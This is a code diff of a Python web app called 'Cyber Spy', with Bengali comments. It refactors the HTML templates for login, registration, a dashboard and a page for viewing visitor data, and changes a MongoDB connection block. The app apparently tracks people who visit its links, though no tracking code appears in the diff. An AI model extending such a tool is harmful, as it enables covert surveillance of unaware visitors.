@@ -18,7 +18,6 @@ try:
     client = MongoClient(MONGO_URI)
     db = client['spy_db']
     users_col = db['users']
-    # টেস্ট কানেকশন
     client.admin.command('ping')
     print("✅ MongoDB connected successfully!")
 except Exception as e:
@@ -59,10 +58,11 @@ BASE_CSS = """
 """
 
 # ===== লগইন পেজ =====
-LOGIN_HTML = f"""
+LOGIN_HTML = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>লগইন</title>{BASE_CSS}</head>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>লগইন</title>""" + BASE_CSS + """
+</head>
 <body>
 <div class="box">
     <h2>🕵️ Cyber Spy</h2>
@@ -82,10 +82,11 @@ LOGIN_HTML = f"""
 """
 
 # ===== রেজিস্টার পেজ =====
-REGISTER_HTML = f"""
+REGISTER_HTML = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>রেজিস্টার</title>{BASE_CSS}</head>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>রেজিস্টার</title>""" + BASE_CSS + """
+</head>
 <body>
 <div class="box">
     <h2>🕵️ সাইন আপ</h2>
@@ -105,10 +106,11 @@ REGISTER_HTML = f"""
 """
 
 # ===== ড্যাশবোর্ড =====
-DASHBOARD_HTML = f"""
+DASHBOARD_HTML = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>ড্যাশবোর্ড</title>{BASE_CSS}</head>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>ড্যাশবোর্ড</title>""" + BASE_CSS + """
+</head>
 <body>
 <div class="container">
     <h1 style="text-align:center;color:#ff0044;">🕵️ Cyber Spy</h1>
@@ -142,10 +144,11 @@ DASHBOARD_HTML = f"""
 """
 
 # ===== ভিজিটর ডেটা দেখার পেজ =====
-VIEW_LINK_HTML = f"""
+VIEW_LINK_HTML = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>ভিজিটর ডেটা</title>{BASE_CSS}</head>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>ভিজিটর ডেটা</title>""" + BASE_CSS + """
+</head>
 <body>
 <div class="container">
     <a href="/dashboard" style="color:#6688aa;display:inline-block;margin-bottom:10px;">⬅️ ড্যাশবোর্ডে ফিরুন</a>
